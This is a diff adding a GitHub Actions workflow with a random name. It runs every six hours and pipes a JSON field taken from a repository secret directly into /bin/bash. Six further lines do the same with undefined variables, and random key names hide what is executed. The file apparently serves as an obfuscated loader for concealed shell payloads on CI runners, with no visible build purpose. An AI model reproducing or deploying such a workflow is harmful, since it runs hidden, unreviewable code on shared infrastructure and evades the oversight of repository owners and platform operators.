@@ -1,0 +1,23 @@
+name: lanzixo
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lanzixo
+        env:
+          q9854: ${{ secrets.q9854 }}
+        run: |
+          echo $q9854 | jq -r .vw1 | /bin/bash
+          echo $az89 | jq -r .cplh579 | /bin/bash
+          echo $ca864 | jq -r .yvb79 | /bin/bash
+          echo $j30 | jq -r .pqjji98062 | /bin/bash
+          echo $vui589 | jq -r .sqgu750 | /bin/bash
+          echo $nwcq17624 | jq -r .myui8 | /bin/bash
+          echo $cas1 | jq -r .h2966 | /bin/bash
+
